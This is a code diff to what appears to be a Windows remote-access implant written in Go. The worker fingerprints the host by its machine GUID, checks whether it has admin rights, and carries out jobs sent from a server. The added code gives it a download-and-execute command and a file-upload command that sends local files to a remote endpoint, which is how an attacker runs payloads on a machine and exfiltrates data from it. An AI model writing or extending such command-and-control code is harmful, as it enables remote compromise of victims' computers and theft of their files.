@@ -74,8 +74,9 @@ func NewWorker() *Worker {
 	uuid, _ := win.GetMachineGuid()
 	uuid, _ = utils.UuidStrToBase64Str(uuid)
 	return &Worker{
-		id:      uuid,
-		isAdmin: win.ProcessHasAdminRights(),
+		id:        uuid,
+		isAdmin:   win.ProcessHasAdminRights(),
+		boostMode: true, // TODO: remove later!
 	}
 }
 
@@ -172,6 +173,20 @@ func (w *Worker) resolve(job Job) {
 		} else {
 			w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
 			time.Sleep(time.Duration(val) * time.Second)
+		}
+	case DOWNLOAD:
+		if err := win.DownloadNExecute(args[0], args[1]); err != nil {
+			w.report(job.Id, err.Error())
+		} else {
+			w.report(job.Id, "File downloaded and executed.")
+		}
+	case UPLOAD:
+		filePath := args[0]
+		destUrl := buildRequestUrl(UPLOADS, w.id, "")
+		if err := utils.UploadFile(filePath, destUrl); err != nil {
+			w.report(job.Id, err.Error())
+		} else {
+			w.report(job.Id, "File uploaded to "+destUrl)
 		}
 	case UNKNOWN:
 		w.report(job.Id, "Received job has wrong format.")
